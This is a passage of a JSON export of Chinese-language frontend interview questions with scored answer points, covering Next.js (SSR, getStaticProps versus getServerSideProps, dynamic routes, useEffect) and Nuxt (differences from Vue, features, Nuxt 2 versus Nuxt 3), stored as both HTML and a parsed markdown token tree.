语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。</p>\\n</li>\\n<li><p><strong>1：</strong> Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。</p>\\n</li>\\n</ul>\\n<h2>什么是服务器端渲染（SSR）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。</li>\\n</ul>\\n<h2>SSR 的原理是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 当用户请求一个页面时，服务器会执行以下步骤：<ul>\\n<li>获取页面数据和模板。</li>\\n<li>使用数据和模板生成完整的 HTML 页面。</li>\\n<li>将 HTML 页面发送给浏览器。</li>\\n<li>浏览器解析和显示 HTML 页面。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件</li>\\n<li><strong>1：</strong> getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点</li>\\n</ul>\\n<h2>如何在 Next.js 应用程序中配置动态路由？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件</li>\\n</ul>\\n<h2>React 中 useEffect 与 Next.js 用途是什么?有什么关系？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。</li>\\n<li><strong>1：</strong> 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Next\\n\\n","depth":1,"text":"Next","tokens":[{"type":"text","raw":"Next","text":"Next","escaped":false}]},{"type":"heading","raw":"## Next.js 与 React 技术选型的区别在哪里？\\n\\n","depth":2,"text":"Next.js 与 React 技术选型的区别在哪里？","tokens":[{"type":"text","raw":"Next.js 与 React 技术选型的区别在哪里？","text":"Next.js 与 React 技术选型的区别在哪里？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n\\n- **1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n\\n","task":false,"loose":true,"text":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n","tokens":[{"type":"text","raw":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n","text":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","text":" React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","task":false,"loose":true,"text":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","tokens":[{"type":"text","raw":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","text":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","text":" Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是服务器端渲染（SSR）？\\n\\n","depth":2,"text":"什么是服务器端渲染（SSR）？","tokens":[{"type":"text","raw":"什么是服务器端渲染（SSR）？","text":"什么是服务器端渲染（SSR）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","task":false,"loose":false,"text":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","tokens":[{"type":"text","raw":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","text":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","text":" 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## SSR 的原理是什么？\\n\\n","depth":2,"text":"SSR 的原理是什么？","tokens":[{"type":"text","raw":"SSR 的原理是什么？","text":"SSR 的原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n  + 获取页面数据和模板。\\n  + 使用数据和模板生成完整的 HTML 页面。\\n  + 将 HTML 页面发送给浏览器。\\n  + 浏览器解析和显示 HTML 页面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n  + 获取页面数据和模板。\\n  + 使用数据和模板生成完整的 HTML 页面。\\n  + 将 HTML 页面发送给浏览器。\\n  + 浏览器解析和显示 HTML 页面。","task":false,"loose":false,"text":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n+ 获取页面数据和模板。\\n+ 使用数据和模板生成完整的 HTML 页面。\\n+ 将 HTML 页面发送给浏览器。\\n+ 浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n","text":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 当用户请求一个页面时，服务器会执行以下步骤：","text":" 当用户请求一个页面时，服务器会执行以下步骤：","escaped":false}]},{"type":"list","raw":"+ 获取页面数据和模板。\\n+ 使用数据和模板生成完整的 HTML 页面。\\n+ 将 HTML 页面发送给浏览器。\\n+ 浏览器解析和显示 HTML 页面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 获取页面数据和模板。\\n","task":false,"loose":false,"text":"获取页面数据和模板。","tokens":[{"type":"text","raw":"获取页面数据和模板。","text":"获取页面数据和模板。","tokens":[{"type":"text","raw":"获取页面数据和模板。","text":"获取页面数据和模板。","escaped":false}]}]},{"type":"list_item","raw":"+ 使用数据和模板生成完整的 HTML 页面。\\n","task":false,"loose":false,"text":"使用数据和模板生成完整的 HTML 页面。","tokens":[{"type":"text","raw":"使用数据和模板生成完整的 HTML 页面。","text":"使用数据和模板生成完整的 HTML 页面。","tokens":[{"type":"text","raw":"使用数据和模板生成完整的 HTML 页面。","text":"使用数据和模板生成完整的 HTML 页面。","escaped":false}]}]},{"type":"list_item","raw":"+ 将 HTML 页面发送给浏览器。\\n","task":false,"loose":false,"text":"将 HTML 页面发送给浏览器。","tokens":[{"type":"text","raw":"将 HTML 页面发送给浏览器。","text":"将 HTML 页面发送给浏览器。","tokens":[{"type":"text","raw":"将 HTML 页面发送给浏览器。","text":"将 HTML 页面发送给浏览器。","escaped":false}]}]},{"type":"list_item","raw":"+ 浏览器解析和显示 HTML 页面。","task":false,"loose":false,"text":"浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"浏览器解析和显示 HTML 页面。","text":"浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"浏览器解析和显示 HTML 页面。","text":"浏览器解析和显示 HTML 页面。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？\\n\\n","depth":2,"text":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","tokens":[{"type":"text","raw":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","text":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件\\n- **1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件\\n","task":false,"loose":false,"text":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","tokens":[{"type":"text","raw":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","text":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","text":" getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","escaped":false}]}]},{"type":"list_item","raw":"- **1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","task":false,"loose":false,"text":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","tokens":[{"type":"text","raw":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","text":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","text":" getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在 Next.js 应用程序中配置动态路由？\\n\\n","depth":2,"text":"如何在 Next.js 应用程序中配置动态路由？","tokens":[{"type":"text","raw":"如何在 Next.js 应用程序中配置动态路由？","text":"如何在 Next.js 应用程序中配置动态路由？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","task":false,"loose":false,"text":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","tokens":[{"type":"text","raw":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","text":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","text":" Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中 useEffect 与 Next.js 用途是什么?有什么关系？\\n\\n","depth":2,"text":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","tokens":[{"type":"text","raw":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","text":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。\\n- **1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。\\n","task":false,"loose":false,"text":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","tokens":[{"type":"text","raw":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","text":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","text":" useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","task":false,"loose":false,"text":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","tokens":[{"type":"text","raw":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","text":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","text":" 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","escaped":false}]}]}]}]},{"key":"Nuxt","content":"<h1>Nuxt</h1>\\n<h2>Nuxt.js和Vue.js有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务端渲染：Nuxt.js支持服务端渲染，可以在服务器端生成页面，提高应用的性能和SEO优化。Vue.js是一个客户端渲染框架，页面内容是在浏览器端生成的。</li>\\n<li><strong>1：</strong> 路由配置：Nuxt.js提供了一种简单的方式来配置路由，自动生成路由配置，而Vue.js需要手动配置路由。</li>\\n<li><strong>1：</strong> 目录结构：Nuxt.js有一个约定的目录结构，使得项目组织更加清晰和易于维护。Vue.js没有明确的目录结构要求，开发者可以根据自己的需求自由组织项目结构。</li>\\n</ul>\\n<h2>nuxt有哪些特性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务器端渲染(SSR)：Nuxt.js 支持服务器端渲染，可以提高网站的性能和搜索引擎优化。</li>\\n<li><strong>1：</strong> 自动路由：Nuxt.js 可以根据项目目录结构自动生成路由配置，减少手动配置的工作量。</li>\\n<li><strong>1：</strong> 预渲染：Nuxt.js 支持预渲染，可以在构建时生成静态 HTML 文件，提高网站的加载速度。</li>\\n<li><strong>1：</strong> 插件系统：Nuxt.js 提供了丰富的插件系统，可以方便地扩展功能和集成第三方库。</li>\\n<li><strong>1：</strong> 中间件：Nuxt.js 支持中间件，可以在路由处理之前或之后执行一些逻辑操作。</li>\\n<li><strong>1：</strong> 数据异步加载：Nuxt.js 支持在页面组件中异步加载数据，可以更好地控制数据的获取和展示。</li>\\n<li><strong>1：</strong> 静态文件服务：Nuxt.js 可以将静态文件直接发布到 CDN 或静态文件服务器，提高网站的访问速度。</li>\\n</ul>\\n<h2>nuxt2和nuxt3的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 性能方面：<br/>\\n&emsp;Nuxt3：性能有显著提升。它采用了 Vite 